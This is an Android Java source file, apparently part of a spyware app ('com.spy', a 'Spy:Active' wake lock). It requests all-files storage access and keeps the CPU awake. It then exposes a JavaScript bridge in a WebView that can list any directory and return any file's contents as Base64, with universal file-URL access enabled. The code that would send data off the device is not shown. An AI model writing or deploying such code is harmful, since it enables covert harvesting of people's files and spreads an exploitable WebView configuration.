package com.spy.v38;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import android.provider.Settings; import java.io.File; import android.util.Base64;
public class MainActivity extends Activity {
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        // Запит доступу Android 11+
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }
        // WakeLock - запобігання сну процесора
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Spy:Active").acquire();
        
        WebView w = new WebView(this);
        w.getSettings().setJavaScriptEnabled(true);
        w.getSettings().setAllowFileAccess(true);
        w.getSettings().setAllowUniversalAccessFromFileURLs(true);
        w.addJavascriptInterface(new Object() {
            @JavascriptInterface public String list(String path) {
                try { 
                    File f = new File(path); 
                    File[] files = f.listFiles(); 
                    if(files == null) return "Access Denied / Empty";
                    StringBuilder sb = new StringBuilder();
                    for (File file : files) sb.append(file.isDirectory() ? "📁 " : "📄 ").append(file.getName()).append("\n");
                    return sb.toString(); 
                } catch (Exception e) { return e.getMessage(); }
            }
            @JavascriptInterface public String getFileBase64(String path) {
                try { 
                    File f = new File(path); 
                    byte[] b = java.nio.file.Files.readAllBytes(f.toPath());
                    return Base64.encodeToString(b, Base64.NO_WRAP); 
                } catch (Exception e) { return "Error: " + e.getMessage(); }
            }
        }, "Android");
        w.loadUrl("file:///android_asset/index.html");
        setContentView(w);
    }
}